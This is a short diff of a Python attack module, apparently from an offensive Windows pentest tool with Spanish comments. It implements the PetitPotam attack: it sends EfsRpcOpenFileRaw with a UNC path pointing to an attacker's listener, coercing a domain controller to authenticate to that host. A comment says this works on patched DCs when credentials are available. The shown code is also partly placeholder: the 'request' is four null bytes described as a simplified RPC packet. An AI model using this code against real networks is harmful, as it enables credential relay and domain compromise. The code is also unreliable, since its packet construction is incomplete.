@@ -111,8 +111,8 @@ class Script(BaseScript):
         Con credenciales funciona en DCs parcheados también (vía pipe autenticado).
         """
         try:
-            from impacket.dcerpc.v5 import transport, epm
-            from impacket.dcerpc.v5.rpcrt import MSRPC_SecVer_3
+            from impacket.dcerpc.v5 import transport
+            from impacket.uuid import uuidtup_to_bin
         except ImportError:
             console.print("  [red]impacket no disponible para PetitPotam[/red]")
             return False
@@ -156,7 +156,6 @@ class Script(BaseScript):
 
                     # Enviar EfsRpcOpenFileRaw con UNC apuntando a nuestro listener
                     unc_path = f"\\\\{listener}\\share\\file"
-                    from impacket.dcerpc.v5.dtypes import WSTR
                     request = b'\x00' * 4  # opnum 0 = EfsRpcOpenFileRaw
                     # Construir el paquete RPC manualmente con el UNC path
                     # (simplificado — impacket maneja el marshaling)
